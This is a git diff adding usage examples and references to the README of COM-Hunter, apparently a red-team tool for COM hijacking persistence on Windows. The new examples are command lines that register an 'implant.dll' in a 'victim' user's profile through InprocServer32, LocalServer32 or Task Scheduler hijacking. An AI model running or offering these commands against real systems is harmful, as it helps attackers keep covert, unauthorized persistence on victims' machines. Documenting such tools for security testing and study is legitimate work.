@@ -33,6 +33,8 @@ This project created with :heart: by [@nickvourd](https://x.com/nickvourd) && [@
     - [Description](#description)
     - [Table of Contents](#table-of-contents)
     - [Usage](#usage)
+    - [Examples](#examples)
+    - [References](#references)
 
 ## Usage
 
@@ -73,3 +75,42 @@ Usage:  COM-Hunter.exe tasksch <binary_path> <option>
     -i, --inprocserver32        Set DLL implementation
     -l, --localserver32         Set EXE implementation
 ```
+
+## Examples
+
+:information_source: Search DLL and EXE implementations in HKLM and HKCU:
+
+```
+.\COM-Hunter.exe search 01575CFE-9A55-4003-A5E1-F38D1EBDCBE1 -a
+```
+
+:information_source: Search EXE implementations in HKLM and HKCU:
+
+```
+.\COM-Hunter.exe search "{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" -l
+```
+
+:information_source: Perform classic persistence via DLL implementation:
+
+```
+.\COM-Hunter.exe persist AB8902B4-09CA-4bb6-B78D-A8F59079A8D5 C:\Users\victim\Desktop\implant.dll -i
+```
+
+:information_source: Perform classic persistence via EXE implementation:
+
+```
+.\COM-Hunter.exe persist "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" C:\Users\victim\Desktop\implant.dll --localserver32
+```
+
+:information_source: Perform persistence via Task Scheduler using DLL implementation:
+
+```
+.\COM-Hunter.exe tasksch C:\Users\victim\Desktop\implant.dll --inprocserver32
+```
+
+## References
+
+- [Persistence: “the continued or prolonged existence of something”: Part 2 – COM Hijacking by MDSec](https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-2-com-hijacking/)
+- [Abusing the COM Registry Structure (Part 2): Hijacking & Loading Techniques by BOHOPS](https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/)
+- [https://enigma0x3.net/2016/05/25/userland-persistence-with-scheduled-tasks-and-com-handler-hijacking/ by Enigma0x3](https://enigma0x3.net/2016/05/25/userland-persistence-with-scheduled-tasks-and-com-handler-hijacking/)
+- [COM Objects Hijacking by Virus Total](https://blog.virustotal.com/2024/03/com-objects-hijacking.html)
